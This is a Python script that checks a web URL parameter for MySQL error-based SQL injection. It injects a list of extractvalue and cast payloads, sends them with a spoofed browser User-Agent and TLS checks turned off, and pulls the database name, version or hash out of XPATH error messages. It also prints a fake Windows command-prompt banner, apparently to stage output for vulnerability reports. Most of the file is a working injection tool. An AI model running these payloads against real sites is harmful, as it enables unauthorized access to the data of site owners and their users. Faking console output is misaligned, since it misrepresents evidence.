#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

payload_list = ["'and/**/extractvalue(1,concat(char(126),{}))and'","\"and/**/extractvalue(1,concat(char(126),{}))and\"","extractvalue(1,concat(char(126),{}))","1/**/and/**/extractvalue(1,concat(char(126),{}))","'and(select'1'from/**/cast({}as/**/int))>'0","1/**/and/**/cast({}as/**/int)>0"]

select_list = ["database()", "version()", "md5(1)"]


def verify(vulnurl):
    headers = {
                'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
                'Upgrade-Insecure-Requests':'1',
                'Connection':'keep-alive',
                'Cache-Control':'max-age=0',
                'Accept-Encoding':'gzip, deflate, sdch',
                'Accept-Language':'zh-CN,zh;q=0.8',
                'Referer': vulnurl
    }
    try:
        r = requests.get(vulnurl, headers=headers, verify=False, timeout=10)
        #print(r.text)
        if "XPATH" in r.text:
            info = re.findall("'?~([^\s']+)'?", r.text)
            if len(info) != 0:
                return info[0]
    except:
        #print(sys.exc_info())
        return "except"
    return "nosql"

def check(vulnurl, parm):
    info = verify(vulnurl)
    if info == "except":
        return False, "except"
    for select in select_list:
        for payload in payload_list:
            select_payload = payload.format(select)
            parm_list = []
            for p in vulnurl.split("?")[1].split("&"):
                if p.split("=")[0] == parm:
                    parm_list.append(parm+"="+select_payload)
                else:
                    parm_list.append(p)
            new_vulurl = vulnurl.split("?")[0] + "?" + "&".join(parm_list)
            info = verify(new_vulurl)
            if info != "except" and info != "nosql":
                return info, select_payload
    return False, info

if __name__=="__main__":
    target = sys.argv[1]
    parm = sys.argv[2]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 mysql_error_inject_check.py ",target, parm)
    for i in range(0,3):
        info, payload = check(target, parm)
        if info != False:
            print("[+]漏洞存在，SQL 检测 paylaod: ", payload,"查询结果为：", info)
            sys.exit()
        else:
            print("[-]漏洞不存在：", payload)
